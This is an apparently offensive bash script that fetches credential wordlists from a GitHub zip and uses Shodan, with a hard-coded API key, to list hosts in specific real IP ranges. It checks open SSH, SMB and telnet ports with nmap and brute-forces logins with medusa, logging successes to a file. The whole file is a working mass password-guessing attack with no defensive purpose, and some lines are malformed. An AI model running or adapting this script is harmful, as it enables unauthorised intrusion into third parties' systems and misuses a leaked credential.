#!/bin/bash 

 "'wget https://github.com/pouriazareie/SSSSSSSS/raw/master/fin.zip && unzip fin.zip && echo -e "\e[42mpls enter ip range:\e[0m"  ;read  get_num; if [[ ! `echo ${get_num} | tr '-' '   '` =~ ^((((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?) (25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))))+$ ]] ;then  echo "${get_num} isn't a number" ; else echo "${get_num} is a number"  && sleep 0.5 && iprange=`echo ${get_num}` ; read -p "Enter port: "  port && echo your chois port number is $port | cut -d " " -f6 | tee port.txt  && read -p "Enter model: " $model && echo your chois model  $model | cut -d " " -f4 | tee model.txt  && sleep 0.5 && sudo apt-get update && pip install shodan && shodan init 0BF9d6blgU0zOV3rnScJtr4C5pRwSet9 && sudo apt-get install medusa -y &&  sudo apt-get install nmap -y && fp=`echo "$iprange" | cut -d. -f1` ;sp=`echo "$iprange" | cut -d. -f2`; ep=`echo "$iprange" | cut -d. -f5` ; while [ $sp -le $ep ];do shodan search --fields ip_str,port:`cat port.txt`  `cat model.txt` net:$fp.$sp.0.0/16 ;((sp++));done | tee -a shodan.txt && sort shodan.txt | awk '{$1=$1}1' | sed '/^$/d' | tee -a  out.txt && nmap -T4 --open -p `cat port.txt` -iL out.txt -oG - | grep "/open" | awk '{print $2}' | tee -a nmap.txt &&  medusa -H nmap.txt -C combo.txt -M `cat model.txt` -n `cat port.txt` -O finds.txt -T 32;fi
cd ..
rm -r NEW 
mkdir NEW && cd NEW
sleep 1000 
'
wget https://github.com/pouriazareie/SSSSSSSS/raw/master/fin.zip
unzip fin.zip
base="2.177.0.0/16" ;shodan search --fields ip_str,port:22 ssh net:$base  | tee -a shodan22.txt  && sort shodan22.txt | awk '{$1=$1}1' | sed '/^$/d' >>  shodans22.txt &&  nmap -Pn -T5 --open -p 22 -iL "shodans22.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap22.txt"  && medusa -H "nmap22.txt" -U user1.txt -P ssh_passwd.txt -M ssh  -n 22 -O "find.txt" -T 32


shodan search --fields ip_str,port:445 smb net:$base  | tee -a shodan445.txt &&  sort shodan445.txt | awk '{$1=$1}1' | sed '/^$/d' >>  shodans445.txt &&  nmap -Pn -T5 --open -p 445 -iL "shodans445.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap445.txt"  && medusa -H "nmap445.txt" -U user1.txt -P p10.txt -M smbnt  -n 445 -O "find.txt" -T 32   

shodan search --fields ip_str,port:139 smb net:$base  | tee -a shodan139  sort shodan139.txt | awk '{$1=$1}1' | sed '/^$/d' >> shodans139.txt &&  nmap -Pn -T5 --open -p 139 -iL "shodans139.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap139.txt" &&   medusa -H "nmap139.txt" -U user1.txt  -P  p10.txt -M smbnt  -n 139 -O "find.txt" -T 32
base="89.165.0.0";shodan search --fields ip_str,port:23  net:$base  | tee -a  shodan23.txt &&  sort shodan23.txt | awk '{$1=$1}1' | sed '/^$/d' >>   shodans23.txt  &&  nmap -Pn -T5 --open -p 23 -iL "shodans23.txt" -oG - | grep "/open" | awk '{print $2}' | tee -a "nmap23.txt" &&  medusa -H "nmap23.txt" -U user1.txt -P ssh_passwd.txt  -M telnet  -n  23 -O "find.txt" -T 32  